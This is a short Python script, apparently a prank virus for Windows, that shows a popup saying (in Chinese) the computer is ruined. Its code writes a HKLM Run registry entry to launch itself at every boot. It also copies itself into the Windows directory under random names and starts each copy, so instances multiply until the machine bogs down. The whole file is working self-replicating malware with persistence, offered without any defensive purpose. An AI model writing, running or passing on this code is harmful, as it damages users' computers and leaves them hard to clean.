# Author:PanDaoxi 
from tkinter import Tk,Label
from random import randint
from os import system,name,environ
from time import sleep

title = "Message"
message = "不好意思，您的电脑废了"
loops = []
window = Tk()
width = window.winfo_screenwidth()
height = window.winfo_screenheight()
x = randint(0,width)
y = randint(0,height)
window.geometry("350x50+" + str(x) + "+" + str(y))
window.title(title)
window.resizable(0, 0)
path = environ["windir"]
system('start /min cmd /c reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "funnywindows" /t REG_SZ /d "%s" /f' % __file__)

def main():
    global loops,window
    Label(window,text=message,font=('Microsoft YaHei',20)).pack()
    with open(__file__,"r",encoding="utf-8") as f:
        text = f.read()
    for i in range(0,2):
        content = "%s\\%d.py" % (path,randint(100000,999999))
        with open(content,"w",encoding="utf-8") as f:
            f.write(text)
        loops.append(content)
    for i in range(0,2):
        system("start /min cmd /c python %s" % loops[i])

if __name__ == "__main__" and name == "nt":
    main()
else:
    showerror("Message","无法运行程序，原因可能是：\n(1)您非主动运行程序。\n(2)这个程序不能在当前系统下运行，请尝试其他操作系统。")
    exit()
window.mainloop()
